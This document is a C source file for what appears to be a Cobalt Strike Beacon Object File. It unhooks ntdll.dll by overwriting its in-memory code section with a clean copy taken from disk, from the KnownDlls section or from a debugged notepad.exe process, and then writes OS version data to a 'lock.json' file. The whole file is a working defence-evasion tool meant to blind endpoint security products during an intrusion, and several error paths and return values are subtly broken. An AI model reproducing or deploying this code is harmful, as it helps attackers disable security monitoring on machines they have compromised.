#include <windows.h>
#include "beacon.h"

#define SECTION_MAP_READ 0x0004
#define OBJ_CASE_INSENSITIVE 0x00000040
#define process_basic_information_size 48
#define peb_offset 0x8
#define ldr_offset 0x18
#define inInitializationOrderModuleList_offset 0x30
#define ProcessBasicInformation 0
#define flink_dllbase_offset 0x20
#define flink_buffer_offset 0x50


// Structs
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;


// Functions
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlGetVersion(POSVERSIONINFOW);

DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateFileMappingA(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$MapViewOfFile(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$DebugActiveProcessStop(DWORD);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
DECLSPEC_IMPORT int      WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH,LPBOOL);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CloseHandle(HANDLE);

void InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a) {
    p->Length = sizeof(OBJECT_ATTRIBUTES);
    p->RootDirectory = NULL;
    p->Attributes = a;
    p->ObjectName = n;
    p->SecurityDescriptor = NULL;
    p->SecurityQualityOfService = NULL;
}

UNICODE_STRING InitUnicodeString(LPCWSTR str) {
    UNICODE_STRING us;
    int data_len = MyWcsLen(str);
    us.Buffer = (PWSTR)str;
    us.Length = data_len * sizeof(WCHAR); // Using lstrlenW for length
    us.MaximumLength = us.Length + sizeof(WCHAR);
    return us;
}


//////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////
int MyStrCmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}


int MyWcsLen(LPCWSTR str) {
    int len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}


PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 8);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 8, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error \n");
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


char* ConvertUnicodeToAnsi(HANDLE hHeap, WCHAR* unicodeStr) {
    int bufferSize = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, unicodeStr, -1, NULL, 0, NULL, NULL);
    if (bufferSize == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to calculate ANSI string size.\n");
        return NULL;
    }
    char* ansiStr = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
    if (ansiStr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for ANSI string.\n");
        return NULL;
    }
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, unicodeStr, -1, ansiStr, bufferSize, NULL, NULL);
    return ansiStr;    
}


char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 256);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 256, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading remote memory. NTSTATUS: 0x%X\n", ntstatus);
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
    }
    WCHAR* unicodeStr = (WCHAR*)buff;

    char* ansiStr = ConvertUnicodeToAnsi(hHeap, unicodeStr);
    if (ansiStr == NULL) {
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
        return;
    }

    KERNEL32$HeapFree(hHeap, 0, buff);
    return ansiStr;
}


void* GetModuleAddr() {
    HANDLE process_handle = (HANDLE) -1;
    
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }

    ULONG returnLength = 0;
    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    // PEB
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);

    // PEB->Ldr
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_address = ReadRemoteIntPtr(process_handle, ldr_pointer);

    // Ldr->InitializationOrderModuleList
    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_address + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(process_handle, InInitializationOrderModuleList);
    
    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        // DLL base address
        dll_base = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
        // DLL name
        void* buffer = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(process_handle, buffer);
        if(MyStrCmp(base_dll_name, "ntdll.dll") == 0){
            return dll_base;
        }
        // DLL full path
        BeaconPrintf(CALLBACK_OUTPUT, "[+] base_dll_name %s\n", base_dll_name); 
        next_flink = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + 0x10));
    }
    return 0;
}


int* GetTextSectionInfo(LPVOID ntdll_address) {
    SIZE_T bytesRead;
    HANDLE hProcess = (HANDLE) -1;
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll_addr: \t\t0x%p\n", ntdll_address);

    // Read e_lfanew (4 bytes) at offset 0x3C
    DWORD e_lfanew;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + 0x3C, &e_lfanew, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading e_lfanew\n");
    }

    // Read SizeOfCode (4 bytes)
    DWORD sizeofcode;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 4, &sizeofcode, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading SizeOfCode\n");
    }

    // Read BaseOfCode (4 bytes)
    DWORD baseofcode;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 20, &baseofcode, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading BaseOfCode\n");
    }

    // Return BaseOfCode and SizeOfCode as an array
    static int result[2];
    result[0] = baseofcode;
    result[1] = sizeofcode;

    return result;
}


LPVOID MapNtdllFromDisk(const char* ntdll_path) {
    HANDLE hFile = KERNEL32$CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CreateFileA\n");
    }

    // CreateFileMappingA
    HANDLE hSection = KERNEL32$CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (hSection == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CreateFileMappingA\n");
        KERNEL32$CloseHandle(hFile);
    }

    // MapViewOfFile
    LPVOID pNtdllBuffer = KERNEL32$MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling MapViewOfFile\n");
        KERNEL32$CloseHandle(hSection);
        KERNEL32$CloseHandle(hFile);
    }

    // Close handles
    if (!KERNEL32$CloseHandle(hFile) || !KERNEL32$CloseHandle(hSection)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CloseHandle\n");
    }

    return pNtdllBuffer;
}


LPVOID MapNtdllFromKnownDlls() {
    LPCWSTR dll_name = L"\\KnownDlls\\ntdll.dll";
    UNICODE_STRING us;
    us = InitUnicodeString(dll_name);

    // Initialize OBJECT_ATTRIBUTES for the section object
    OBJECT_ATTRIBUTES obj_attr;
    InitializeObjectAttributes(&obj_attr, &us, OBJ_CASE_INSENSITIVE);

    // Open the section for the DLL
    HANDLE hSection = NULL;
    NTSTATUS status = NTDLL$NtOpenSection(&hSection, SECTION_MAP_READ, &obj_attr);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtOpenSection. NTSTATUS: 0x%X\n", status);
    }

    // Map the section into memory
    LPVOID pNtdllBuffer = KERNEL32$MapViewOfFile(hSection, SECTION_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling MapViewOfFile\n");
        NTDLL$NtClose(hSection);
    }

    // Close the section handle
    status = NTDLL$NtClose(hSection);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtClose. NTSTATUS: 0x%X\n", status);
    }

    return pNtdllBuffer;
}


void *my_memset(void *ptr, int value, size_t num) {
    unsigned char *p = (unsigned char *)ptr;
    while (num--) {
        *p++ = (unsigned char)value;
    }
    return ptr;
}


// Translated function
LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    BOOL createprocess_res;

    // Initialize structures
    my_memset(&si, 0, sizeof(si));
    si.cb = sizeof(STARTUPINFOA);
    my_memset(&pi, 0, sizeof(pi));

    // Create process with DEBUG_PROCESS flag
    createprocess_res = KERNEL32$CreateProcessA(
        process_path,
        NULL,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!createprocess_res) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling CreateProcess\n");
    }

    void* localNtdllHandle = GetModuleAddr();
    int* result = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = result[0];
    int localNtdllTxtSize = result[1];
    LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle + localNtdllTxtBase);

    // Allocate memory for the buffer to hold the ntdll text section
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    BYTE* ntdllBuffer = (BYTE*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, localNtdllTxtSize);
    
    if (!ntdllBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error allocating memory for ntdll buffer\n");
    }

    // Read the ntdll text section from the target process
    SIZE_T bytesRead;
    BOOL readprocmem_res = KERNEL32$ReadProcessMemory(
        pi.hProcess,
        localNtdllTxt,
        ntdllBuffer,
        localNtdllTxtSize,
        &bytesRead
    );

    if (!readprocmem_res || bytesRead != localNtdllTxtSize) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading process memory\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer;

    // Stop debugging the process and terminate it
    BOOL debugstop_res = KERNEL32$DebugActiveProcessStop(pi.dwProcessId);
    BOOL terminateproc_res = KERNEL32$TerminateProcess(pi.hProcess, 0);
    if (!debugstop_res || !terminateproc_res) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling DebugActiveProcessStop or TerminateProcess\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    // Close process and thread handles
    BOOL closehandle_proc = KERNEL32$CloseHandle(pi.hProcess);
    BOOL closehandle_thread = KERNEL32$CloseHandle(pi.hThread);
    if (!closehandle_proc || !closehandle_thread) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling CloseHandle\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    return pNtdllBuffer;
}


void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
    DWORD dwOldProtection;

    // Change protection to PAGE_EXECUTE_WRITECOPY
    if (!KERNEL32$VirtualProtect(localNtdllTxt, localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        BeaconPrintf(CALLBACK_ERROR, "Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)\n");
        return;  // Exit function on failure
    }
    
    // Manually copy the memory (replace memcpy)
    unsigned char *src = (unsigned char *)unhookedNtdllTxt;
    unsigned char *dst = (unsigned char *)localNtdllTxt;
    for (SIZE_T i = 0; i < localNtdllTxtSize; i++) {
        dst[i] = src[i];
    }

    // Restore original memory protection
    if (!KERNEL32$VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        BeaconPrintf(CALLBACK_ERROR, "Error calling VirtualProtect (dwOldProtection)\n");
        return;

    }
}


void ReplaceLibrary(char* option){
    long long unhookedNtdllTxt = 0;
    LPVOID unhookedNtdllHandle;
    const int offset_mappeddll = 4096;
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] option: \t%s\n", option);

    if (MyStrCmp(option, "disk") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: disk\n");
        const char* ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
        unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
        unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
    }
    else if (MyStrCmp(option, "knowndlls") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: knowndlls\n");
        unhookedNtdllHandle = MapNtdllFromKnownDlls();
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
        unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);

    }
    else if (MyStrCmp(option, "debugproc") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: debugproc\n");
        const char* proc_path = "c:\\Windows\\System32\\notepad.exe";     
        unhookedNtdllTxt = MapNtdllFromDebugProc(proc_path);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
    }
    else{
        return;
    }

    // Replace
    void* localNtdllHandle = GetModuleAddr();
    int* textSectionInfo = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = textSectionInfo[0];
    int localNtdllTxtSize = textSectionInfo[1];
    long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;

    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtBase: \t\t0x%p\n", localNtdllTxtBase);
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtSize: \t\t0x%p\n", localNtdllTxtSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Copying %d bytes from 0x%p to 0x%p.\n", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);

    ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
}
//////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////


int MyStrLen(char *str) {
    int len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}


void MyIntToStr(int value, char* buffer) {
    char temp[12];
    int i = 0;
    int is_negative = 0;
    if (value < 0) {
        is_negative = 1;
        value = -value;
    }
    do {
        temp[i++] = (value % 10) + '0';
        value /= 10;
    } while (value > 0);
    if (is_negative) {
        temp[i++] = '-';
    }
    int j = 0;
    while (i > 0) {
        buffer[j++] = temp[--i];
    }    
    buffer[j] = '\0';
}


char* create_string_with_var(char* f1, char* var1, char* f2) {
    size_t f1_len = MyStrLen(f1);
    size_t v1_len = MyStrLen(var1);
    size_t f2_len = MyStrLen(f2);
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    size_t total_len = f1_len + v1_len + f2_len + 1;  // +1 for null terminator
    char* result = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);    
    if (result == NULL) {
        return NULL;
    }
    size_t offset = 0;
    for (size_t i = 0; i < f1_len; i++) {
        result[offset++] = f1[i];
    }
    for (size_t i = 0; i < v1_len; i++) {
        result[offset++] = var1[i];
    }
    for (size_t i = 0; i < f2_len; i++) {
        result[offset++] = f2[i];
    }
    result[offset] = '\0';
    return result;
}


char* concatenate_strings(char* str1, char* str2) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    size_t len1 = MyStrLen(str1);
    size_t len2 = MyStrLen(str2);
    char* result = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, len1 + len2 + 1);
    if (result == NULL) {
        return NULL;
    }
    for (size_t i = 0; i < len1; i++) {
        result[i] = str1[i];
    }
    for (size_t i = 0; i < len2; i++) {
        result[len1 + i] = str2[i];
    }
    result[len1 + len2] = '\0';
    return result;
}


void write_string_to_file(char* file_path, char* data) {
    // CreateFile
    HANDLE hFile = KERNEL32$CreateFileA(file_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create file: %s\n", file_path);
        return;
    }

    // WriteFile
    DWORD bytesWritten;
    int data_len = MyStrLen(data);
    BOOL result = KERNEL32$WriteFile(hFile, data, data_len, &bytesWritten, NULL);
    if (!result) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write to file: %s\n", file_path);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] File %s generated (%d bytes).\n", file_path, bytesWritten);
    }

    // Close handle
    KERNEL32$CloseHandle(hFile);
}


void Lock(const char* filename){
    OSVERSIONINFOW osvi;
    NTSTATUS status = NTDLL$RtlGetVersion(&osvi);
    if (status == 0) {
        char* majorversion_buffer[12];
        MyIntToStr(osvi.dwMajorVersion, majorversion_buffer);
        char* minorversion_buffer[12];
        MyIntToStr(osvi.dwMinorVersion, minorversion_buffer);
        char* buildnumber_buffer[12];
        MyIntToStr(osvi.dwBuildNumber, buildnumber_buffer);
        char* json_part_1 = create_string_with_var("{ \"field0\": \"", majorversion_buffer, "\", ");
        char* json_part_2 = create_string_with_var("\"field1\": \"", minorversion_buffer, "\", ");        
        char* json_part_3 = create_string_with_var("\"field2\": \"", buildnumber_buffer, "\"}");
        char* json_entry = concatenate_strings(concatenate_strings(json_part_1, json_part_2), json_part_3);
        char* json_output = concatenate_strings(concatenate_strings("[", json_entry), "]");
        write_string_to_file(filename, json_output);
    }
}


void go(char *args, int length) {
    // Get first argument value
    //      - disk:        09000000050000006469736b00
    //      - knowndlls:   0e0000000a0000006b6e6f776e646c6c7300
    //      - debugproc:   0e0000000a000000646562756770726f6300    
    datap  parser;
    char * option;
    BeaconDataParse(&parser, args, length);
    option = BeaconDataExtract(&parser, NULL);
    if (option){
        ReplaceLibrary(option);
    }

    // Filename
    char* filename = "lock.json";

    Lock(filename);
}